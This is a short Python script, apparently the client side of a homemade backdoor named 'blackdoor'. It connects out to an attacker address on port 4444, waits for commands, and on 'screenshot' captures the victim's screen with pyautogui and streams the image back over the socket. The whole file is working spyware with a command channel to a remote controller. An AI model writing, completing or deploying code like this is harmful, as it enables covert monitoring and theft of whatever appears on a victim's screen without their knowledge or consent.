import socket
import pyautogui
from io import BytesIO

def connect_with_attacker():
    # server_ip = '192.168.0.136'
    server_ip = '127.0.1.1'
    port = 4444

    blackdoor = socket.socket()
    blackdoor.connect((server_ip, port))

    while True:
        try:
            message = blackdoor.recv(1024).decode("UTF-8")

            if message == 'screenshot':
                send_screenshot(blackdoor)
            else:
                pass
        except:
            print("error")
            blackdoor.close()
            break
        pass

    # wait for orders
    # while True:
    #

def send_screenshot(blackdoor):
    screenshot = pyautogui.screenshot()
    buffered = BytesIO()
    screenshot.save(buffered, format="PNG")
    buffered.seek(0)
    package = buffered.read(1024)
    while package:
        blackdoor.send(package)
        package = buffered.read(1024)
    blackdoor.send(str.encode('Finished'))
    print("sending finished")


# attacker_thread = threading.Thread(target=connect_with_attacker)
connect_with_attacker()